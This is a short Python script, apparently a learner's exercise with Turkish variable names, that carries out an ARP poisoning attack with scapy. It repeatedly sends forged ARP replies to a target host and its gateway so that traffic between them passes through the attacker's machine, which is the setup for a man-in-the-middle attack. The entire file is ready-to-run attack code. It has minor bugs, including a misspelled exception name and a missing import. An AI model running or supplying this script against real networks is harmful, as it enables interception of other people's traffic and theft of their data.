from scapy.all import *
import subprocess
import time


hedef_ip ="10.0.2.2"
gateway_ip ="10.0.2.1"

ifconfigResult = subprocess.check_output("ifconfig eth0", shell=True).decode()
attacker_mac = re.search("ether(.*?)txqueuelen",ifconfigResult).group(1).strip()

eth = Ether(src=attacker_mac)
hedef_arp = ARP(hwsrc=attacker_mac,psrc=gateway_ip,pdst=hedef_ip)
gateway_arp = ARP(hwsrc=attacker_mac,psrc=hedef_ip,pdst=gateway_ip)

print("Arp Poising Attack is Starting. . . ")

while True:
	try:
		sendp(eth/hedef_arp,verbose=False)
		send(eth/gateway_arp,verbose=False)
	except KeyboardInterrup:
		print("Arp Poising is Stopped")
		break
	# time.sleep(1) #opsiyonel
		
